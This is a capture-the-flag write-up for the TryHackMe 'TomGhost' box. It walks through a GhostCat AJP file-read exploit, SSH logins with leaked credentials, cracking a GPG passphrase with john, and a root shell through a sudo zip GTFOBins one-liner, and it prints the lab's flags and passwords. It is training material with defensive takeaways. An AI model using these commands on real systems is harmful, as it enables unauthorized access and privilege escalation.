# 👻 TomGhost — TryHackMe Writeup

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
![CVE](https://img.shields.io/badge/CVE-2020--1938-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=flat-square)

> Apache Tomcat AJP file read → GPG credential decrypt → sudo zip privesc → root

---

## 📋 Box Info

| Field       | Details                          |
|-------------|----------------------------------|
| Name        | TomGhost                         |
| OS          | Linux (Ubuntu 16.04)             |
| Difficulty  | Easy                             |
| CVE         | CVE-2020-1938 (GhostCat)        |
| Attack Path | Web → Lateral → Privesc          |

---

## 🗺️ Attack Chain

```
GhostCat (AJP 8009)
  └─► web.xml credential leak  →  SSH as skyfuck
        └─► gpg2john + rockyou  →  decrypt credential.pgp
              └─► SSH as merlin
                    └─► sudo zip GTFOBins  →  root shell
```

---

## 🔍 Enumeration

### TCP & UDP Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 tomghost.thm -oA tomghost_tcp
sudo nmap -sU -sC -sV -vv tomghost.thm -oA tomghost_udp
```

Key finding: **port 8009 open** — Tomcat AJP connector, the attack surface for GhostCat.

---

## 💀 Initial Access — GhostCat (CVE-2020-1938)

Apache Tomcat's AJP connector allows unauthenticated file reads from the web application. No credentials needed.

```bash
python3 exploit.py http://tomghost 8009 /WEB-INF/web.xml read
```

`web.xml` response leaked plaintext credentials:

```xml
<description>
   Welcome to GhostCat
      skyfuck:8730281lkjlkjdqlksalks
</description>
```

> **Why this works:** The AJP connector was never meant to be publicly exposed. It's an internal protocol for load balancers talking to Tomcat. When exposed with no authentication, any file under the webapp root is readable — including config files that often contain credentials.

---

## 🦶 Foothold — SSH as skyfuck

```bash
ssh skyfuck@tomghost
# password: 8730281lkjlkjdqlksalks
```

User flag accessible immediately (world-readable):

```
THM{GhostCat_1s_so_cr4sy}
```

---

## 🔀 Lateral Movement — GPG Key Cracking

`skyfuck`'s home directory had two files fetched from a prior wget session:

```
credential.pgp    ← PGP-encrypted credential file
tryhackme.asc     ← Armored GPG private key (passphrase protected)
```

**Step 1 — Extract hash and crack the key passphrase:**

```bash
gpg2john tryhackme.asc > hash.txt
john hash.txt --wordlist=./rockyou.txt
```

```
alexandru        (tryhackme)
1g 0:00:00:00 DONE — 33.33g/s 38400p/s
```

**Step 2 — Import key and decrypt the credential:**

```bash
gpg --import tryhackme.asc   # passphrase: alexandru
gpg --decrypt credential.pgp
```

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

---

## ⚡ Privilege Escalation — zip GTFOBins

Logged in as `merlin` and checked sudo rights:

```bash
sudo -l
```

```
(root : root) NOPASSWD: /usr/bin/zip
```

`zip` has a built-in integrity test flag (`-T`) that runs a command post-archive. The `-TT` flag lets you override what command gets executed. The `#` comments out any trailing arguments zip appends to your command — leaving a clean shell spawn:

```bash
sudo /usr/bin/zip hello.zip /etc/hosts -T -TT '/bin/sh #'
```

```
updating: etc/hosts (deflated 31%)
# whoami
root
```

---

## 🏁 Root Flag

```bash
cat /root/root.txt
```

```
THM{Z1P_1S_FAKE}
```

---

## 📌 Key Takeaways

| Finding | Real-World Relevance |
|---------|----------------------|
| AJP connector exposed (8009) | Misconfigured Tomcat deployments still exist in production — always scan for it |
| Credentials in `web.xml` | Config files leaking secrets is a recurring real-world finding |
| GPG private key + encrypted file, same machine | Encryption is useless if the key is co-located and the passphrase is weak |
| `sudo zip` privesc | Any unrestricted sudo binary is a potential privesc — always cross-reference GTFOBins |

---

## 🛠️ Tools Used

`nmap` · `GhostCat PoC` · `gpg2john` · `john` · `gpg` · `GTFOBins`